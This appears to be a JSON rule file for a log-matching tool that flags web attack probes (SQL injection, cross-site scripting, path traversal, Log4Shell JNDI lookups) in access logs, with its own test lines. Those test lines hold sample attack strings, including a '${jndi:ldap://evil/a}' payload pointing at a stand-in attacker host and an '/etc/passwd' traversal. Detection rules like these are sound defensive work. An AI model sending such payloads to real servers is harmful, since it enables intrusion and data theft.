{
  "schema": 1,
  "name": "Web attack probes",
  "intent": "Injection and traversal attempts in an access log, minus our own scanner.",
  "join": "any",
  "ignore_case": true,
  "dot_matches_newline": false,
  "multiline": true,
  "anchor_start": false,
  "anchor_end": false,
  "scope": "line",
  "rules": [
    {
      "kind": "find",
      "pattern": "(?:'(?:[\\s+]|%20)*(?:or|and)(?:[\\s+]|%20)*'?\\d+'?(?:[\\s+]|%20)*=(?:[\\s+]|%20)*'?\\d+|(?<![A-Za-z])union(?:[\\s+]|%20)+(?:all(?:[\\s+]|%20)+)?select\\b|(?<![A-Za-z])or(?:[\\s+]|%20)+1(?:[\\s+]|%20)*=(?:[\\s+]|%20)*1\\b|;(?:[\\s+]|%20)*(?:drop|truncate)(?:[\\s+]|%20)+table\\b|(?<![A-Za-z])sleep(?:[\\s+]|%20)*\\((?:[\\s+]|%20)*\\d+(?:[\\s+]|%20)*\\)|(?<![A-Za-z])waitfor(?:[\\s+]|%20)+delay\\b|(?<![A-Za-z])benchmark(?:[\\s+]|%20)*\\((?:[\\s+]|%20)*\\d+)",
      "label": "sql injection probe",
      "literal": false,
      "whole_word": false,
      "capture": false,
      "capture_name": "",
      "ignore_case": true,
      "enabled": true,
      "repeat": {
        "mode": "once",
        "minimum": 1,
        "maximum": 1,
        "greedy": true
      },
      "note": "Finds attempts, not successes. Handles + and %20 but not double encoding, comment obfuscation or casing tricks. Useful on access logs; not a WAF.",
      "source": "sqli_probe"
    },
    {
      "kind": "find",
      "pattern": "(?:<\\s*script\\b|javascript\\s*:|on(?:error|load|mouseover|focus)\\s*=|<\\s*img[^>]*\\bsrc\\s*=\\s*[\\\"']?\\s*x\\b|document\\.cookie)",
      "label": "cross-site scripting probe",
      "literal": false,
      "whole_word": false,
      "capture": false,
      "capture_name": "",
      "ignore_case": true,
      "enabled": true,
      "repeat": {
        "mode": "once",
        "minimum": 1,
        "maximum": 1,
        "greedy": true
      },
      "note": "Legitimate HTML in a log line matches. Encoding, entities and SVG vectors evade it. Triage aid, not a control.",
      "source": "xss_probe"
    },
    {
      "kind": "find",
      "pattern": "(?:\\.\\.[/\\\\]|%2e%2e(?:%2f|%5c)|\\.\\.%2f|%252e%252e)",
      "label": "path traversal",
      "literal": false,
      "whole_word": false,
      "capture": false,
      "capture_name": "",
      "ignore_case": true,
      "enabled": true,
      "repeat": {
        "mode": "once",
        "minimum": 1,
        "maximum": 1,
        "greedy": true
      },
      "note": "Covers common encodings only. Unicode and overlong UTF-8 forms exist and are not here.",
      "source": "traversal"
    },
    {
      "kind": "find",
      "pattern": "\\$\\{\\s*(?:jndi|\\$\\{[^}]*\\})\\s*:?[^}]*\\}",
      "label": "jndi lookup (log4shell)",
      "literal": false,
      "whole_word": false,
      "capture": false,
      "capture_name": "",
      "ignore_case": true,
      "enabled": true,
      "repeat": {
        "mode": "once",
        "minimum": 1,
        "maximum": 1,
        "greedy": true
      },
      "note": "Obfuscation of this payload was creative and widespread. A negative result here is worth very little.",
      "source": "log4shell"
    },
    {
      "kind": "exclude",
      "pattern": "10.20.0.9",
      "label": "our authorised scanner",
      "literal": true,
      "whole_word": false,
      "capture": false,
      "capture_name": "",
      "ignore_case": null,
      "enabled": true,
      "repeat": {
        "mode": "once",
        "minimum": 1,
        "maximum": 1,
        "greedy": true
      },
      "note": "",
      "source": ""
    }
  ],
  "proof": [
    {
      "text": "198.51.100.8 - - [11/Mar/2024] \"GET /?q=1+UNION+ALL+SELECT+null HTTP/1.1\" 200",
      "expect": "should_match",
      "note": ""
    },
    {
      "text": "192.0.2.44 - - [11/Mar/2024] \"GET /../../etc/passwd HTTP/1.1\" 400",
      "expect": "should_match",
      "note": ""
    },
    {
      "text": "192.0.2.44 - - [11/Mar/2024] \"GET /x?a=${jndi:ldap://evil/a} HTTP/1.1\" 404",
      "expect": "should_match",
      "note": ""
    },
    {
      "text": "10.20.0.9 - - [11/Mar/2024] \"GET /?q=1+UNION+ALL+SELECT+null HTTP/1.1\" 200",
      "expect": "should_not_match",
      "note": ""
    },
    {
      "text": "10.0.4.30 - - [11/Mar/2024] \"GET /healthz HTTP/1.1\" 200",
      "expect": "should_not_match",
      "note": ""
    }
  ],
  "sample": "access"
}
